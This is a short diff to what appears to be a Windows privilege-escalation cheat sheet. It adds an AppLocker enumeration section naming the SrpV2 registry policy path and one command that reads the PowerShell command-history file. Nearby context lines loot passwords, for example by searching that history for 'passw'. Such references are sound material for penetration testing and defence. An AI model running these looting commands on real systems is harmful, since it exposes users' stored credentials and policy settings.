@@ -6,6 +6,7 @@
 * [Windows Version and Configuration](#windows-version-and-configuration)
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
+* [AppLocker Enumeration](#applocker-enumeration)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
     * [Search for file contents](#search-for-file-contents)
@@ -218,6 +219,11 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
+## AppLocker Enumeration
+
+- With the GPO
+- HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+
 ## EoP - Looting for passwords
 
 ### SAM and SYSTEM files
@@ -394,6 +400,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 
 ```powershell
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
